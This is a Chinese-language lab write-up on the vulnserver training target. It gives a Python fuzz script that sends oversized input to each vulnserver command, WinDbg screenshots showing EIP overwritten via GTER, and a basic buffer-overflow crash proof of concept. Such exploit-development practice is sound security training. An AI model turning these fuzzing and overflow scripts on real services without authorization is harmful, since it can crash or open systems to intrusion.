### vulnserver

一个非常适合练手的项目

https://github.com/stephenbradshaw/vulnserver.git

首先把这个项目下载到本地然后打开 , 启动程序以后会开启9999端口 
<img width="1208" height="644" alt="image" src="https://github.com/user-attachments/assets/0f531174-0ac0-449b-80b2-2357a79a72fc" />
在 kali 用 nc 连接查看一下 , 有诸多选项 
<img width="743" height="675" alt="image" src="https://github.com/user-attachments/assets/d49a0653-70e1-432c-8234-a2b09349a654" />
#### fuzz测试

基本上就是每个选项都需要  command argv 这样的形式 , 首先进行一次 fuzz 测试

他的参数很多 , 也可以手工测试 , 但是太费时间了

写一个基础的 fuzz 脚本 , 执行之前 , 要把程序本身加载到 windbg 当中

```python 
#!/usr/bin/python
import socket
import sys
import time

server = sys.argv[1]
port = 9999

# Vulnserver 的所有可用命令列表
commands = [
    "STATS", "RTIME", "LTIME", "SRUN", "TRUN", 
    "GMON", "GDOG", "KSTET", "GTER", "HTER", 
    "LTER", "KSTAN"
]

# 测试的 Payload：这里以 100 个 A 为例（可根据需要调整大小）
payload = b"A" * 100

for cmd in commands:
    try:
        print(f"Testing command: {cmd} ...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        
        # 接收并打印初始欢迎信息
        s.recv(1024)
        
        # 发送命令 + 填充数据
        packet = cmd.encode() + b" " + payload + b"\r\n"
        s.send(packet)
        
        # 接收服务器响应
        response = s.recv(1024)
        print(f"Response: {response.decode(errors='ignore').strip()}")
        
        s.close()
        time.sleep(1) # 稍作暂停，避免请求过快
        
    except socket.error:
        print(f"[-] Connection failed or server crashed on command: {cmd}")
        break
```

执行过后会看到输出
<img width="1091" height="534" alt="image" src="https://github.com/user-attachments/assets/82014e08-c837-400b-986f-875bb8c2e164" />
查看 windbg  ,  eip 已经被覆盖
<img width="1443" height="616" alt="image" src="https://github.com/user-attachments/assets/e2ff4783-cadc-4451-b467-707f1aad904f" />
由此确定问题出在 GTER 参数上 , 由此写一个基础 poc 代码

```python
#!/usr/bin/python
import socket
import sys

try:
    server = sys.argv[1]
    port = 9999
    size = 1500

    inputBuffer = b"A" * size
  
    command = b"GTER "
    command+= inputBuffer
    command+= b"\r\n"

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(command)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")

```



